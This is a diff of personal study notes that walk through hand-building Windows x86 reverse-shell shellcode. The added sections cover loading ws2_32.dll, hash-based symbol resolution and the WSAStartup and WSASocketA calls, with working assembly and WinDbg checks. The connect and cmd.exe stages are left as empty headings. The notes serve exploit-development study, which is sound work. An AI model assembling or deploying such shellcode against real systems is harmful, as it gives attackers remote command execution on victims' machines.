@@ -451,14 +451,18 @@ CODE = (
   
 5. `resolve_symbols_kernel32:` responsible for the `find_function` call, previously in `start`, but now using the address from the stack `call dword ptr [ebp+0x04]`  
 6. `exec_shellcode:` performs the syscall function to TerminateProcess, previously in `start` 
+
+Test functionality by once again placing a break point after we find the location of TerminateProcess and `u eax` to confirm that we get `KERNEL32!TerminateProcessStub`
 # Reverse Shell  
-A common shellcode expoloit is the reverse shell. Most of the required APIs are exported by `Ws2_32.dll`.  
+The most common shellcode exploit is the reverse shell, of which most of the required APIs are exported by `Ws2_32.dll`.  
 The initialization chain for the connection will be:  
 Initialize Winsock DLL via WSAStartup -> WSASocketA to create the socket -> WSAConnect to establish the connection.  
 CreateProcessA to start cmd.exe (from kernel32.dll)  
   
 ### Loading ws2_32.dll and Resolving Symbols  
-We already loaded kernel32 the hard way, which gives us access to it's functions, like LoadLibraryA, which can be used to load ws2_32.dll. Its functions can then be found using the same method we built before (or alternatively GetProcAddress also from kernel32).  
+We already loaded kernel32 the hard way, which gives us access to it's functions, like LoadLibraryA, which can be used to load ws2_32.dll. Its symbols / functions can then be found using the same method we built before (or alternatively GetProcAddress also from kernel32).  
+
+Base addresses for modules must be stored in ebx, as this is used by the functions to calculate a VMA from an RVA.
   
 Loading ws2_32.dll and its symbols:  
 ```  
@@ -487,7 +491,7 @@ These modifications are repetitive and probably don't need deep explanations
 4. Repeat for each function  
   
   
-Call to LoadLibraryA:  
+Call to LoadLibraryA with ws2_32.dll:  
 ```  
  " load_ws2_32:                       "  #  
     "   xor   eax, eax                  ;"  #   Null EAX  
@@ -505,11 +509,11 @@ Call to LoadLibraryA:
 3. `push eax` : move `ll\0\0` to the stack  
 4. `push 0x642e3233` : move the second byte "32.d" to the stack  
 5. `push 0x5f327377` : move the first byte "ws2_" to the stack  
-6. `push esp` : push the pointer to this string on the stack  
+6. `push esp` : push the pointer to this string on the stack (this string pointer is actually the only argument required by LoadLibraryA, so we push the address of the string we just pushed)
 7. `call dword ptr[ebp+0x14]` : call LoadLibraryA  
   
   
-Finding symbols in ws2_32.dll:  
+Finding WSAStartup symbol in ws2_32.dll:  
 ```  
     " resolve_symbols_ws2_32:            "  
     "   mov   ebx, eax                  ;"  #   Move the base address of ws2_32.dll to EBX  
@@ -520,7 +524,117 @@ Finding symbols in ws2_32.dll:
 ```  
   
 `resolve_symbols_ws2_32:`  
-1. `mov ebx, eax` : move the ws2_32.dll address into ebx  
+1. `mov ebx, eax` : move the ws2_32.dll address from LoadLibraryA into ebx (it returns a handle which is also the base address) 
 2. `push 0x3bfcedcb` : push pre-gen hash of WSAStartup  
 3. `call dword ptr [ebp+0x04]` : call our find_function  
-4. mov [ebp+0x1c], eax` : store the base module address to the stack
+4. `mov [ebp+0x1c], eax` : store the retrieved symbol address to the stack
+
+Test this works by setting a breakpoint at the start of `load_ws2_32` and stepping through until the the pointer to the string has been loaded on the stack, then `da poi(esp)` to ensure that the string is `ws2_32.dll`. `p` to step over the function call and `r eax` to get the return value (the module handle / base address) and `lm m ws2_32` to make sure the base address matches.
+
+
+### Calling WSAStartup
+Using the prototype for WSAStartup: https://learn.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup we set up a call to this function in ws2_32.dll to initiate Winsock DLL.
+
+Prototype:
+```
+int WSAStartup(
+  WORD      wVersionRequired,
+  LPWSADATA lpWSAData
+);
+```
+
+The nested structure of WSAData (https://learn.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-wsadata) needs space allocated on the stack for the syscall (which populates it), so we look into its prototype as well to determine how much space is needed.
+> The docs show that some fields are no longer used, or of variable size depending on the version. Instead of coding our own socket and inspecting in WinDbg, we can use ReactOS docs
+
+Pertinent info: 
+- WSAStartup Version used is 2.2
+- https://doxygen.reactos.org/d0/d96/structWSAData.html#acedc22f14e73bf97545feb47197fac07 has all fields in WSAData
+- Max length szDescription is 257 bytes (256 + null term)
+- Max length szSystemStatus is 129 bytes
+- 2 (word) + 2 (word) + 2 (u_short) + 2 (u_short) + 4 (char*) + 257 + 129 = 398 bytes
+
+WSAData on its own is larger than the stack space we previously carved out to fit our structure pushes, so we need to go back and make more.
+`start:`
+`...`
+`add esp, 0xfffff9f0`
+
+Call to WSAStartup:
+```
+"call_wsastartup:                   "  #
+"   mov   eax, esp                  ;"  #   Move ESP to EAX
+"   mov   cx, 0x590                 ;"  #   Move 0x590 to CX
+"   sub   eax, ecx                  ;"  #   Subtract CX from EAX to avoid overwriting the structure later
+"   push  eax                       ;"  #   Push lpWSAData
+"   xor   eax, eax                  ;"  #   Null EAX
+"   mov   ax, 0x0202                ;"  #   Move version to AX
+"   push  eax                       ;"  #   Push wVersionRequired
+"   call dword ptr [ebp+0x1C]       ;"  #   Call WSAStartup
+```
+
+`call_wsastartup:`
+1. `mov eax, esp` : move our current stack pointer (where resolved symbols are stored) to eax
+2. `mov cx, 0x590` : move in a large number to be subtracted from eax (to create an address high up on the stack)
+3. `sub eax, ecx` : subtract
+4. `push eax` : push in eax as the lpWSAData pointer. Because the API call writes to this, it needs to be far up the stack so it's data isn't corrupted by later calls
+5. `xor eax, eax` : zero out
+6. `mov ax, 0x0202` : move the version, 2.2, to eax
+7. `push eax` : push in 2.2 as the version
+8. `call dword ptr [ebp+0x1C]` : Call WSAStartup
+
+Test this by setting a breakpoint in `call_wsastartup` and stepping through the argument pushes, use `dd esp L2` to ensure they were pushed correctly. Then, step over the call to `WSAStartup` and ensure that the return value in eax is a `0` return code, signifying a successful call.
+
+
+### Calling WSASocketA
+Creates a socket.
+Docs: https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa
+
+Prototype:
+```
+SOCKET WSAAPI WSASocketA(
+  int                 af,
+  int                 type,
+  int                 protocol,
+  LPWSAPROTOCOL_INFOA lpProtocolInfo,
+  GROUP               g,
+  DWORD               dwFlags
+);
+```
+
+- af, type, and protocol are all standard types listed in the docs
+- WSAProtocolInfo is a nested struct. But if set to NULL, Winsock will just use a default which matches the previous parameters
+- g can be set to NULL as well since we are creating a stand alone socket
+- dwFlags is for additional socket info, which we don't need so NULL again.
+
+Argument push and call to WSASocketA:
+```
+    " call_wsasocketa:                   "  #
+    "   xor   eax, eax                  ;"  #   Null EAX
+    "   push  eax                       ;"  #   Push dwFlags
+    "   push  eax                       ;"  #   Push g
+    "   push  eax                       ;"  #   Push lpProtocolInfo
+    "   mov   al, 0x06                  ;"  #   Move AL, IPPROTO_TCP
+    "   push  eax                       ;"  #   Push protocol
+    "   sub   al, 0x05                  ;"  #   Subtract 0x05 from AL, AL = 0x01
+    "   push  eax                       ;"  #   Push type
+    "   inc   eax                       ;"  #   Increase EAX, EAX = 0x02
+    "   push  eax                       ;"  #   Push af
+    "   call dword ptr [ebp+0x20]       ;"  #   Call WSASocketA
+```
+
+I'm not going to break down this one, it's much simpler than the last one and any specific questions about values can be found in the docs. Remember we push the values to stack in reverse order.
+> Remember to add in `resolve_symbols_ws2_32` a call to `find_function` with the pre-gen hash of WSASocketA and save the returned address to stack.
+```
+"   push 0xadf509d9     ;" #
+"   call dword ptr [ebp+0x04];" #
+"   mov [ebp+0x20], eax ;" #
+```
+
+Test with a breakpoint in the `call_wsasocketa` function, ensure the stack values are pushed correctly and step over the function call to make sure that eax holds something resembling a "descriptor referencing the socket" (as opposed to 0xFFFF which means INVALID_SOCKET.
+
+
+### Calling WSAConnect
+Establishes a socket connection.
+
+
+
+### Calling CreateProcessA
